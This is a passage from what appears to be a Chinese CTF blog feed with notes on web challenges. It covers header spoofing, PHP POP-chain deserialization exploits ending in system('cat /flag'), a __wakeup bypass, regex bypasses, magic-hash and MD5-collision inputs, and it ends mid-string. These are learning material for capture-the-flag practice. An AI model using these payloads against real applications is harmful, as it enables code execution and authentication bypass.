}}。访问源代码通常是利用这一点所必需的，如给定的示例所示：</p><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p Person)</span></span> Secret (test <span class="type">string</span>) <span class="type">string</span> &#123;</span><br><span class="line">    out, \_ := exec.Command(test).CombinedOutput()</span><br><span class="line">    <span class="keyword">return</span> <span class="type">string</span>(out)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见的各种http要求以及对应的headers</title>
      <link href="/posts/93fc8735.html"/>
      <url>/posts/93fc8735.html</url>
      
        <content type="html"><![CDATA[<h1 id="GET-传参"><a href="#GET-传参" class="headerlink" title="GET 传参"></a>GET 传参</h1><p>传参传的参数会被理解成字符串, 传数组如下，[]内不填默认为 0<br>xxx.com&#x2F;?a&#x3D;1&amp;b&#x3D;2&amp;c[0]&#x3D;3&amp;c[1]&#x3D;4&amp;d[]&#x3D;5</p><h1 id="POST-传参"><a href="#POST-传参" class="headerlink" title="POST 传参"></a>POST 传参</h1><p>把 GET 请求改为 POST,如果用的 burp 可以用这个一键切<br><img src="/img/http/change_request.png"></p><p>不能切的话把 GET 改为 POST，在下面加<br>Content-Type: application&#x2F;x-www-form-urlencoded<br>Content-Length: 0<br>Content-Length 需要改数值，建议勾选 burp 的修改 body 长度（默认勾选）不用手动更改，数值取决于你 POST 传参的长度，如 a&#x3D;4 长度为 3<br>当存在 Transfer-Encoding: chunked 时，Content-Length 会被忽略<br>没有 POST 传参最后要留两行空，不然会无法打开<br>POST 参数跟 http 头之间要空一行，后面不能有空行</p><p><img src="/img/http/post_request.png"></p><h1 id="PUT-等更多类型的传参"><a href="#PUT-等更多类型的传参" class="headerlink" title="PUT 等更多类型的传参"></a>PUT 等更多类型的传参</h1><p>直接把 GET 开头改成 PUT 就行</p><h1 id="要求-ip-地址为-127-0-0-1-要求本地权限"><a href="#要求-ip-地址为-127-0-0-1-要求本地权限" class="headerlink" title="要求 ip 地址为 127.0.0.1 &#x2F; 要求本地权限"></a>要求 ip 地址为 127.0.0.1 &#x2F; 要求本地权限</h1><p>这种要求如果在 http 题中只要 xff 伪造 ip 就行，如果要 ssrf 伪造它就不是 http 题</p><p>X-Forwarded-For: 127.0.0.1<br>Client-IP: 127.0.0.1<br>X-Real-IP: 127.0.0.1<br>这三个任选添加，都可能通过，大小写随意，注意 xff 的 ed 不要少写。</p><h1 id="要求挂代理"><a href="#要求挂代理" class="headerlink" title="要求挂代理"></a>要求挂代理</h1><p>via: xxx.vip</p><h1 id="SERVER-‘FLAG’-’123’等-php-参数"><a href="#SERVER-‘FLAG’-’123’等-php-参数" class="headerlink" title="$_SERVER[‘FLAG’]&#x3D;&#x3D;’123’等 php 参数"></a>$_SERVER[‘FLAG’]&#x3D;&#x3D;’123’等 php 参数</h1><p>FLAG: 123</p><h1 id="要求改-UA-浏览器"><a href="#要求改-UA-浏览器" class="headerlink" title="要求改 UA &#x2F; 浏览器"></a>要求改 UA &#x2F; 浏览器</h1><p>User-Agent: Firefox Browser</p><h1 id="要求你的邮件地址"><a href="#要求你的邮件地址" class="headerlink" title="要求你的邮件地址"></a>要求你的邮件地址</h1><p>From: <a href="mailto:&#120;&#120;&#x78;&#x40;&#101;&#120;&#97;&#x6d;&#x70;&#x6c;&#x65;&#46;&#99;&#111;&#109;">&#120;&#120;&#x78;&#x40;&#101;&#120;&#97;&#x6d;&#x70;&#x6c;&#x65;&#46;&#99;&#111;&#109;</a></p><h1 id="要求来自-网址-origin"><a href="#要求来自-网址-origin" class="headerlink" title="要求来自 网址 (origin)"></a>要求来自 网址 (origin)</h1><p>Referer: xxx.org</p><h1 id="要求改-Cookie"><a href="#要求改-Cookie" class="headerlink" title="要求改 Cookie"></a>要求改 Cookie</h1><p>格式如 Cookie: user&#x3D;admin</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php的pop链构造&amp;反序列化</title>
      <link href="/posts/32daafef.html"/>
      <url>/posts/32daafef.html</url>
      
        <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>构造 pop 链，归根结底就是一条绳子，从你开始的函数穿到危险函数（或者指向 flag），所以你要做的第一件事，就是确认你的开始和结尾。</p><h1 id="部分魔术方法触发方法"><a href="#部分魔术方法触发方法" class="headerlink" title="部分魔术方法触发方法"></a>部分魔术方法触发方法</h1><p><strong>__wakeup()</strong> 使用 unserialize()时触发<br><strong>__construct()</strong> 当创建对象时触发<br><strong>__destruct()</strong> 当一个对象被销毁时触发<br><strong>__toString()</strong> 当一个类被当成字符串使用时触发，如 echo<br><strong>__invoke()</strong> 当尝试以调用函数的方式调用一个对象时触发<br><strong>__call()</strong> 在对象上下文中调用不可访问的方法时触发<br><strong>__callStatic()</strong> 在静态上下文中调用不可访问的方法时触发<br><strong>__get()</strong> 用于从不可访问的属性读取数据<br><strong>__set()</strong> 用于将数据写入不可访问的属性<br><strong>__isset()</strong> 在不可访问的属性上调用 isset()或 empty()触发<br><strong>__unset()</strong> 在不可访问的属性上使用 unset()时触发<br><strong>__sleep()</strong> 使用 serialize()时触发</p><h1 id="不含绕过的链子构造"><a href="#不含绕过的链子构造" class="headerlink" title="不含绕过的链子构造"></a>不含绕过的链子构造</h1><p>__wakeup(),__construct(),__destruct() 都可以看做开头，优先级从左到右。你要做的，就是引导这个绳子头，直至穿到危险函数。</p><p>我们来看一道例题，这是我在学习构造 pop 链时做出的第一道题，出自 Geek Challenge 2024 unsign</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">syc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cuit</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)#4</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;action!&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="variable">$function</span>=<span class="variable language_">$this</span>-&gt;cuit;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();<span class="comment">#3</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lover</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$yxx</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$QW</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;invoke!&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;yxx-&gt;QW;<span class="comment">#2</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$eva1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$interesting</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$var</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;get!&lt;br&gt;&quot;</span>);</span><br><span class="line">        <span class="variable">$eva1</span>=<span class="variable language_">$this</span>-&gt;eva1;</span><br><span class="line">        <span class="variable">$eva1</span>(<span class="variable language_">$this</span>-&gt;interesting);<span class="comment">#1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>首先我们注意到 class web 下存在一种很危险的格式<br>**$eva1($this-&gt;interesting);<strong>也就是在 eva1&#x3D;”eval”时，就等于 eval()了，所以它作为尾。标个 1<br>然后我们需要触发__get()方法。这个方法常在调用私有或不存在对象时触发。怎么触发呢，我们观察 php 代码，观察到 lover 下的</strong>return $this-&gt;yxx-&gt;QW;**很可疑。我们可以控制 yxx 的 class，将它设为 web。这样当这条语句触发时，QW 找不到，就会触发我们的**get()，标为 2<br>__invoke()算是最容易看出来的方法了，只要变量作为函数来调用就会触发。所以 syc 的$function();可以触发。标个 3<br>destruct 可以作为头，结束 标个 4<br>所以链子总结如下</p><pre><code>url-&gt;syc#__destruct()-&gt;cuit-&gt;lover#\_\_invoke(&#39;$function&#39;)-&gt;yxx-&gt;web#\_\_get(&#39;QW&#39;)-&gt;system(&#39;cat /flag&#39;)</code></pre><p>关键 exp</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$syc</span>=<span class="keyword">new</span> <span class="title function_ invoke__">syc</span>();</span><br><span class="line"><span class="variable">$lover</span>=<span class="keyword">new</span> <span class="title function_ invoke__">lover</span>();</span><br><span class="line"><span class="variable">$web</span>=<span class="keyword">new</span> <span class="title function_ invoke__">web</span>();</span><br><span class="line"><span class="variable">$url</span>=<span class="variable">$syc</span>;</span><br><span class="line"><span class="variable">$url</span>-&gt;cuit=<span class="variable">$lover</span>;</span><br><span class="line"><span class="variable">$lover</span>-&gt;yxx=<span class="variable">$web</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$url</span>);<span class="comment">//url-&gt;syc#__destruct()-&gt;cuit-&gt;lover#__invoke(&#x27;$function&#x27;)-&gt;yxx-&gt;web#__get(&#x27;QW&#x27;)-&gt;system(&#x27;cat /flag&#x27;)</span></span><br></pre></td></tr></table></figure><h1 id="需要绕过的链子构造"><a href="#需要绕过的链子构造" class="headerlink" title="需要绕过的链子构造"></a>需要绕过的链子构造</h1><h2 id="private-和-protected-属性的变量"><a href="#private-和-protected-属性的变量" class="headerlink" title="private 和 protected 属性的变量"></a>private 和 protected 属性的变量</h2><p>输出 serialize 时一定要经过编码，基本是 url 编码，如果题目要求 base64 编码就不用先 url 编码了<br>如果你要对 private 和 protected 里的数赋值时，如果 php 版本低可能没回显。<br>养成良好习惯，使用__construct()赋值</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">web</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> a=<span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> b;</span><br><span class="line">    <span class="keyword">protected</span> c;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b=<span class="string">&#x27;bbb&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;c=<span class="string">&#x27;ccc&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>强调下 construct 的赋值方式，不能直接写$b,要写$this-&gt;b,且 function 前加 public。</p><h2 id="str-replace-替换字符导致的字符串逃逸"><a href="#str-replace-替换字符导致的字符串逃逸" class="headerlink" title="str_replace 替换字符导致的字符串逃逸"></a>str_replace 替换字符导致的字符串逃逸</h2><p>比如替换函数为 str_replace(‘SDPCSEC’,’hacker’,$parm);我们注意到每次替换就少了一个字符，但被替换的字符串前的数字没有变，所以我们就可以构造字符个数，每输出一次就会吞掉后面一个字符，最后的参数就由你自己控制了。<br>一个参考的输出程序，可以把篡改字符串放在$a 里，注意开头要加”用于闭合引号</p><h3 id="字符变少"><a href="#字符变少" class="headerlink" title="字符变少"></a>字符变少</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;&quot;;s:1:&quot;B&quot;;s:12:&quot;[phpinfo();]&quot;;s:1:&quot;C&quot;;N;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>);<span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;SDPCSEC&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>);</span><br></pre></td></tr></table></figure><h3 id="字符变多"><a href="#字符变多" class="headerlink" title="字符变多"></a>字符变多</h3><p>提前闭合，因为反序列化会舍去;}后的任何内容。<br>轮子还没造，待实现中。。。</p><h2 id="wakeup-绕过"><a href="#wakeup-绕过" class="headerlink" title="wakeup 绕过"></a>wakeup 绕过</h2><h3 id="增加属性对象绕过（CVE-2016-7124）"><a href="#增加属性对象绕过（CVE-2016-7124）" class="headerlink" title="增加属性对象绕过（CVE-2016-7124）"></a>增加属性对象绕过（CVE-2016-7124）</h3><pre><code>PHP5 &lt; 5.6.25 和 PHP7 &lt; 7.0.10</code></pre><p>我们增加 :{ 前的数字，这会绕过 wakeup 检测。</p><pre><code>O:7:&quot;Secrect&quot;:2:&#123;s:13:&quot;%00Secrect%00demo&quot;;s:15:&quot;unseria1i2e.php&quot;;s:4:&quot;file&quot;;s:8:&quot;f14g.php&quot;;&#125;</code></pre><p>绕过为</p><pre><code>O:7:&quot;Secrect&quot;:3:&#123;s:13:&quot;%00Secrect%00demo&quot;;s:15:&quot;unseria1i2e.php&quot;;s:4:&quot;file&quot;;s:8:&quot;f14g.php&quot;;&#125;</code></pre><h3 id="C-开头绕过"><a href="#C-开头绕过" class="headerlink" title="C 开头绕过"></a>C 开头绕过</h3><p>将 O 改成 C 就可以，但是弊端就是这个类中的对象都没有属性了，也就是不能命令执行<br>如果碰到需要命令执行就得多几步了，正好 ArrayObject 内置类可以构造以 C 开头的反序列化 <a href="https://www.yuque.com/boogipop/tdotcs/hobe2yqmb3kgy1l8?singleDoc#">https://www.yuque.com/boogipop/tdotcs/hobe2yqmb3kgy1l8?singleDoc#</a></p><h2 id="正则匹配绕过"><a href="#正则匹配绕过" class="headerlink" title="正则匹配绕过"></a>正则匹配绕过</h2><pre><code>O:4:&quot;Test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;</code></pre><p>假设此时的匹配为(preg_match(‘&#x2F;username&#x2F;‘, $data));这时你可以把 username 前的 s 大写，并将你要绕过的内容或一部分转为 16 进制，如</p><pre><code>O:4:&quot;Test&quot;:1:&#123;S:8:&quot;\75sername&quot;;s:5:&quot;admin&quot;;&#125;</code></pre><p>如果此时的匹配为(preg_match(‘&#x2F;O:[%d]’, $data));你可以这么写</p><pre><code>O:+4:&quot;Test&quot;:1:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;&#125;</code></pre><h2 id="两变量哈希相等"><a href="#两变量哈希相等" class="headerlink" title="两变量哈希相等"></a>两变量哈希相等</h2><h3 id="引用绕过"><a href="#引用绕过" class="headerlink" title="引用绕过"></a>引用绕过</h3><p>b 取 a 的地址</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="title function_ invoke__">uniqid</span>();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;a === <span class="variable language_">$this</span>-&gt;b) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;Success&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>poc</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$test</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="variable">$test</span>-&gt;b=&amp;<span class="variable">$test</span>-&gt;a;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$test</span>));</span><br></pre></td></tr></table></figure><h3 id="内置类绕过"><a href="#内置类绕过" class="headerlink" title="内置类绕过"></a>内置类绕过</h3><h4 id="Error（仅能用于-PHP7）"><a href="#Error（仅能用于-PHP7）" class="headerlink" title="Error（仅能用于 PHP7）"></a>Error（仅能用于 PHP7）</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;?&gt;&lt;?=include~&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%d0%99%93%9e%98&quot;</span>).<span class="string">&quot;?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">1</span>);<span class="variable">$b</span>=<span class="keyword">new</span> <span class="built_in">Error</span>(<span class="variable">$str</span>,<span class="number">2</span>);</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">SYCLOVER</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt;syc = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;lover = <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>));</span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">//注意两个Error一定要同行</span></span><br><span class="line"><span class="comment">//str开头要用?&gt;闭合</span></span><br></pre></td></tr></table></figure><h4 id="Exception-PHP5-PHP7-可用"><a href="#Exception-PHP5-PHP7-可用" class="headerlink" title="Exception(PHP5,PHP7 可用)"></a>Exception(PHP5,PHP7 可用)</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CDUTSEC</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$var2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span>=<span class="string">&quot;phpinfo();?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="variable">$cmd</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="variable">$cmd</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$tr</span> = <span class="keyword">new</span> <span class="title function_ invoke__">CDUTSEC</span>();</span><br><span class="line"><span class="variable">$tr</span>-&gt;var1=<span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$tr</span>-&gt;var2=<span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$tr</span>));</span><br></pre></td></tr></table></figure><h1 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h1><p>这里推一篇翻到的反序列化文章：<a href="https://5ime.cn/unserialize.html">https://5ime.cn/unserialize.html</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见的哈希函数绕过个人收藏</title>
      <link href="/posts/66a71aff.html"/>
      <url>/posts/66a71aff.html</url>
      
        <content type="html"><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><p>php 对 MD5 加密方法为$a&#x3D;md5(‘string’);比起python就是神仙级，壮哉php。<br>php中存在强比较(&#x3D;&#x3D;&#x2F;!&#x3D;)和弱比较(&#x3D;&#x3D;&#x3D;&#x2F;!&#x3D;&#x3D;)，组两个数组比较可以绕过两个比较(a[]&#x3D;1&amp;b[]&#x3D;2)<br>0e+纯数字只能绕过弱比较，注意只是0e开头是不能绕过比较的。<br>md5($password,’true’)-&gt;ffifdyop 多用于 sql 绕过密码</p><h1 id="MD4"><a href="#MD4" class="headerlink" title="MD4"></a>MD4</h1><h2 id="md4-等于自己-a-md4-a"><a href="#md4-等于自己-a-md4-a" class="headerlink" title="md4 等于自己 -&gt; $a&#x3D;&#x3D;md4($a);"></a>md4 等于自己 -&gt; $a&#x3D;&#x3D;md4($a);</h2><p>0e251288019 0e898201062</p><h1 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h1><h2 id="md5-后-0e-数字-md5-a-md5-b"><a href="#md5-后-0e-数字-md5-a-md5-b" class="headerlink" title="md5 后 0e+数字 -&gt; md5($a)&#x3D;&#x3D;md5($b)"></a>md5 后 0e+数字 -&gt; md5($a)&#x3D;&#x3D;md5($b)</h2><p>byGcY sonZ7y QNKCDZO 240610708 s878926199a s155964671a s214587387a</p><h2 id="md5-后-等于自己-a-md5-a"><a href="#md5-后-等于自己-a-md5-a" class="headerlink" title="md5 后 等于自己 -&gt; $a&#x3D;&#x3D;md5($a)"></a>md5 后 等于自己 -&gt; $a&#x3D;&#x3D;md5($a)</h2><p>0e215962017 0e00275209979 0e00506035745 0e00540451811 0e00678205148<br>0e00741250258 0e00928251504 0e01350016114 0e01352028862<br>0e01392313004 0e01875552079 0e01975903983 0e02042356163<br>0e02218562930 0e02451355147 0e02739970294 0e02760920150<br>0e02784726287 0e03298616350 0e03393034171</p><h2 id="双-md5-后等于自己-a-md5-md5-a-（没错真的有这个数）"><a href="#双-md5-后等于自己-a-md5-md5-a-（没错真的有这个数）" class="headerlink" title="双 md5 后等于自己 -&gt; $a&#x3D;&#x3D;md5(md5($a)) （没错真的有这个数）"></a>双 md5 后等于自己 -&gt; $a&#x3D;&#x3D;md5(md5($a)) （没错真的有这个数）</h2><p>0e1138100474</p><h2 id="单-md5-后等于双-md5-后的自己-md5-a-md5-md5-a"><a href="#单-md5-后等于双-md5-后的自己-md5-a-md5-md5-a" class="headerlink" title="单 md5 后等于双 md5 后的自己 -&gt; md5($a)&#x3D;&#x3D;md5(md5($a))"></a>单 md5 后等于双 md5 后的自己 -&gt; md5($a)&#x3D;&#x3D;md5(md5($a))</h2><p>（施工中）</p><h2 id="如果你可以-serialize-反序列化控制数字，而题目限制了字符长度为-5-以下"><a href="#如果你可以-serialize-反序列化控制数字，而题目限制了字符长度为-5-以下" class="headerlink" title="如果你可以 serialize 反序列化控制数字，而题目限制了字符长度为 5 以下"></a>如果你可以 serialize 反序列化控制数字，而题目限制了字符长度为 5 以下</h2><p>那你可以试试 INF 和 NAN 两个数字，因为无法求值，它们的 md5 值就是字符串的 md5 值</p><h2 id="md5-强相等碰撞-md5-a-md5-b-md5-c"><a href="#md5-强相等碰撞-md5-a-md5-b-md5-c" class="headerlink" title="md5 强相等碰撞 -&gt; md5($a)&#x3D;&#x3D;&#x3D;md5($b)&#x3D;&#x3D;&#x3D;md5($c)"></a>md5 强相等碰撞 -&gt; md5($a)&#x3D;&#x3D;&#x3D;md5($b)&#x3D;&#x3D;&#x3D;md5($c)</h2><p><strong>a&#x3D;</strong>%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%df%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%73%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%69%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%93%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%28%1c%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%b9%05%39%95%ab<br><strong>&amp;b&#x3D;</strong>%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3%8f%93%e3%52%73%73%53%a0%5f%69%ef%c3%3b%ea%ee%70%71%ae%2a%21%c8%44%d7%22%87%9f%be%79%6d%c4%61%a4%08%57%02%82%2a%ef%36%95%da%ee%13%bc%fb%7e%a3%59%45%ef%25%67%3c%e0%27%69%2b%95%77%b8%cd%dc%4f%de%73%24%e8%ab%66%74%d2%8c%68%06%80%0c%dd%74%ae%31%05%d1%15%7d%c4%5e%bc%0b%0f%21%23%a4%96%7c%17%12%d1%2b%b3%10%b7%37%60%68%d7%cb%35%5a%54%97%08%0d%54%78%49%d0%93%c3%b3%fd%1f%0b%35%11%9d%96%1d%ba%64%e0%86%ad%ef%52%98%2d%84%12%77%bb%ab%e8%64%da%a3%65%55%5d%d5%76%55%57%46%6c%89%c9%5f%b2%3c%85%97%1e%f6%38%66%c9%17%22%e7%ea%c9%f5%d2%e0%14%d8%35%4f%0a%5c%34%d3%f3%a5%98%f7%66%72%aa%43%e3%bd%a2%cd%62%fd%e9%1d%34%30%57%52%ab%41%b1%91%65%f2%30%7f%cf%c6%a1%8c%fb%dc%c4%8f%61%a5%13%40%1a%13%d1%09%c5%e0%f7%87%5f%48%e7%d7%b3%62%04%a7%c4%cb%fd%f4%ff%cf%3b%74%a8%1b%96%8e%09%73%3a%9b%a6%2f%ed%b7%99%d5%39%05%39%95%ab<br><strong>&amp;c&#x3D;</strong>%af%13%76%70%82%a0%a6%58%cb%3e%23%38%c4%c6%db%8b%60%2c%bb%90%68%a0%2d%e9%47%aa%78%49%6e%0a%c0%c0%31%d3%fb%cb%82%25%92%0d%cf%61%67%64%e8%cd%7d%47%ba%0e%5d%1b%9c%1c%5c%cd%07%2d%f7%a8%2d%1d%bc%5e%2c%06%46%3a%0f%2d%4b%e9%20%1d%29%66%a4%e1%8b%7d%0c%f5%ef%97%b6%ee%48%dd%0e%09%aa%e5%4d%6a%5d%6d%75%77%72%cf%47%16%a2%06%72%71%c9%a1%8f%00%f6%9d%ee%54%27%71%be%c8%c3